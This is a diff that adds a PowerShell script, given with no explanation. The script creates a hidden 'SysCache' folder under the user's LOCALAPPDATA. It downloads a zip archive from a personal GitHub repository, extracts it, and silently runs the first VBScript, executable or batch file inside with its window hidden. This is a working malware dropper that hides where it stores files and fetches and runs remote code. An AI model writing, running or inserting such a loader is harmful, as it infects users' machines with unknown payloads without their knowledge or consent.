@@ -1,0 +1,23 @@
+$base = 'https://github.com/jesuss13377-source/d/raw/refs/heads/main/'
+$hiddenDir = Join-Path $env:LOCALAPPDATA 'SysCache'
+if (-not (Test-Path $hiddenDir)) { New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null }
+$f = Get-Item $hiddenDir -Force
+$f.Attributes = $f.Attributes -bor [System.IO.FileAttributes]::Hidden
+
+$zip = Join-Path $hiddenDir 'data.zip'
+
+curl.exe -L -s -o $zip "$base`script.zip"
+
+if (Test-Path $zip) {
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zip, $hiddenDir, $true)
+    Remove-Item -Path $zip -Force -ErrorAction SilentlyContinue
+}
+
+$target = Get-ChildItem -Path $hiddenDir -Recurse -Include *.vbs,*.exe,*.bat | Select-Object -First 1
+if ($target) {
+    switch ($target.Extension) {
+        '.vbs' { Start-Process -FilePath 'wscript.exe' -ArgumentList "`"$($target.FullName)`"" -WindowStyle Hidden }
+        default { Start-Process -FilePath $target.FullName -WindowStyle Hidden }
+    }
+}
